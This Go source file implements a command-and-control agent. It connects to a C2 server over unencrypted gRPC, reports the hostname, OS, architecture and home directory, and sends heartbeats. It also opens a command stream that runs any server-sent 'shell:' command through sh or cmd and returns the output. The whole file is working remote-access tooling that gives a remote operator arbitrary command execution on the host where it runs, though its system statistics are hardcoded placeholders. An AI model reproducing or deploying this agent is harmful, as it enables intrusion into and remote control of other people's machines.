package agent

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/keepalive"

	pb "portal/proto"
)

// C2Agent is the client for the C2 framework
type C2Agent struct {
	serverAddr  string
	agentID     string
	info        *pb.AgentInfo
	conn        *grpc.ClientConn
	client      pb.C2ServiceClient
	ctx         context.Context
	cancel      context.CancelFunc
	wg          sync.WaitGroup
	commandChan chan *pb.Command
}

// NewC2Agent creates a new C2 agent
func NewC2Agent(serverAddr string) *C2Agent {
	ctx, cancel := context.WithCancel(context.Background())

	return &C2Agent{
		serverAddr:  serverAddr,
		ctx:         ctx,
		cancel:      cancel,
		commandChan: make(chan *pb.Command, 10),
	}
}

// Connect establishes a connection with the C2 server
func (a *C2Agent) Connect() error {
	var opts []grpc.DialOption
	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	opts = append(opts, grpc.WithKeepaliveParams(keepalive.ClientParameters{
		Time:                10 * time.Second,
		Timeout:             5 * time.Second,
		PermitWithoutStream: true,
	}))

	conn, err := grpc.Dial(a.serverAddr, opts...)
	if err != nil {
		return fmt.Errorf("failed to connect to server: %w", err)
	}

	a.conn = conn
	a.client = pb.NewC2ServiceClient(conn)

	return nil
}

// Register registers the agent with the C2 server
func (a *C2Agent) Register() error {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	// Get username
	username := "unknown"
	if u, err := os.UserHomeDir(); err == nil {
		username = u
	}

	// Create agent info
	info := &pb.AgentInfo{
		Hostname:         hostname,
		Os:               runtime.GOOS,
		Architecture:     runtime.GOARCH,
		Username:         username,
		RegistrationTime: time.Now().Unix(),
	}

	// Register with server
	resp, err := a.client.RegisterAgent(a.ctx, info)
	if err != nil {
		return fmt.Errorf("failed to register agent: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("registration failed: %s", resp.ErrorMessage)
	}

	a.agentID = resp.AgentId
	a.info = info
	a.info.AgentId = resp.AgentId

	log.Printf("Agent registered successfully with ID: %s", a.agentID)
	return nil
}

// StartHeartbeat starts sending periodic heartbeats to the server
func (a *C2Agent) StartHeartbeat(interval time.Duration) {
	a.wg.Add(1)
	go func() {
		defer a.wg.Done()
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				a.sendHeartbeat()
			case <-a.ctx.Done():
				log.Println("Heartbeat goroutine stopped")
				return
			}
		}
	}()
}

// sendHeartbeat sends a heartbeat to the server
func (a *C2Agent) sendHeartbeat() {
	stats := &pb.SystemStats{
		CpuUsage:    getCPUUsage(),
		MemoryUsage: getMemoryUsage(),
		Uptime:      getUptime(),
	}

	req := &pb.HeartbeatRequest{
		AgentId:   a.agentID,
		Timestamp: time.Now().Unix(),
		Stats:     stats,
	}

	resp, err := a.client.Heartbeat(a.ctx, req)
	if err != nil {
		log.Printf("Failed to send heartbeat: %v", err)
		return
	}

	if !resp.Success {
		log.Printf("Heartbeat not acknowledged by server")
	}
}

// StartCommandStream starts the bidirectional command stream
func (a *C2Agent) StartCommandStream() error {
	a.wg.Add(1)
	go func() {
		defer a.wg.Done()
		for {
			err := a.handleCommandStream()
			if err != nil {
				log.Printf("Command stream error: %v, reconnecting in 5 seconds...", err)
				select {
				case <-a.ctx.Done():
					return
				case <-time.After(5 * time.Second):
					// Retry
				}
			}
		}
	}()
	return nil
}

// handleCommandStream manages the command stream
func (a *C2Agent) handleCommandStream() error {
	stream, err := a.client.SendCommands(a.ctx)
	if err != nil {
		return err
	}

	// Send initial message with agent ID using Command message
	initCmd := &pb.Command{
		Id:          a.agentID, // Using Id to pass agent ID
		CommandType: "register",
		Timestamp:   time.Now().Unix(),
	}
	if err := stream.Send(initCmd); err != nil {
		return err
	}

	// Start goroutine to handle incoming command responses
	errCh := make(chan error, 1)
	go func() {
		for {
			resp, err := stream.Recv()
			if err != nil {
				errCh <- err
				return
			}

			log.Printf("Received command response: %s, success: %v", resp.CommandId, resp.Success)
			// Process command
			go a.executeCommandResponse(resp, stream)
		}
	}()

	select {
	case err := <-errCh:
		return err
	case <-a.ctx.Done():
		return stream.CloseSend()
	}
}

// executeCommandResponse processes a command response from the server
func (a *C2Agent) executeCommandResponse(resp *pb.CommandResponse, stream pb.C2Service_SendCommandsClient) {
	// Extract the command from the response
	commandString := string(resp.Result)
	var result []byte

	log.Printf("Executing command: %s", commandString)

	// Execute the command based on the original command type
	if resp.CommandId != "" {
		switch {
		case strings.HasPrefix(commandString, "shell:"):
			shellCmd := strings.TrimPrefix(commandString, "shell:")
			output, err := executeShellCommand(shellCmd)
			if err != nil {
				result = []byte(err.Error())
			} else {
				result = output
			}
		default:
			// For other command types
			result = []byte(fmt.Sprintf("Received command: %s", commandString))
		}
	}

	// Send the result back
	cmd := &pb.Command{
		Id:          resp.CommandId,
		CommandType: "response",
		Payload:     result,
		Timestamp:   time.Now().Unix(),
	}

	if err := stream.Send(cmd); err != nil {
		log.Printf("Failed to send command result: %v", err)
	}
}

// executeShellCommand executes a shell command and returns its output
func executeShellCommand(command string) ([]byte, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("command execution error: %w", err)
	}

	return output, nil
}

// Stop gracefully stops the agent
func (a *C2Agent) Stop() {
	a.cancel()
	a.wg.Wait()
	if a.conn != nil {
		a.conn.Close()
	}
	log.Println("Agent stopped")
}

// Helper functions
func getCPUUsage() float64 {
	// This is a placeholder - in a real implementation you would
	// measure actual CPU usage
	return 5.0
}

func getMemoryUsage() float64 {
	// This is a placeholder - in a real implementation you would
	// measure actual memory usage
	return 20.0
}

func getUptime() int64 {
	// This is a placeholder - in a real implementation you would
	// get the system uptime
	return 3600
}